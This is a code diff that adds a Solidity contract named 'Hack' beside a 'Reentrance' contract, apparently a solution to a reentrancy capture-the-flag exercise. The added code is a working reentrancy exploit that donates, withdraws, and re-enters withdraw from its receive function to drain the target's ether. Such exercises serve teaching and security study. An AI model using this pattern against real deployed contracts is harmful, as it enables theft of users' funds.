@@ -27,3 +27,29 @@ contract Reentrance {
 
     receive() external payable {}
 }
+
+contract Hack {
+    Reentrance reentrance;
+    uint256 contractValue;
+
+    constructor(address payable _reentrance) public {
+        reentrance = Reentrance(_reentrance);
+    }
+
+    receive() external payable {
+        if (contractValue > 0) {
+            reentrance.withdraw(contractValue);
+        }
+    }
+
+    function attack() public payable {
+        contractValue = address(reentrance).balance;
+        require(contractValue > 0, "Contract is empty");
+        reentrance.donate{value: contractValue}(address(this));
+        reentrance.withdraw(contractValue);
+    }
+
+    function showBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
